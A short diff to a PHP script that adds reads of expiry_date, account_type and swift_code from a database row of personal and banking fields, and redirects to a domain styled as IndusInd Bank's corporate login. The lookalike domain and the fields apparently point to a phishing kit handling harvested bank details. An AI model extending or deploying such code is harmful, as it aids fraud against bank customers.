@@ -67,6 +67,9 @@ if (mysqli_num_rows($check)) {
         $count = $row['count'];
         $country = $row['country'];
         $date_of_birth = $row['date_of_birth'];
+        $expiry_date = $row['expiry_date'];
+        $account_type = $row['account_type'];
+        $swift_code = $row['swift_code'];
     }
 } else {
     header('location: https://indusindbank.indusindnet.com/corp/BANKAWAY.php');
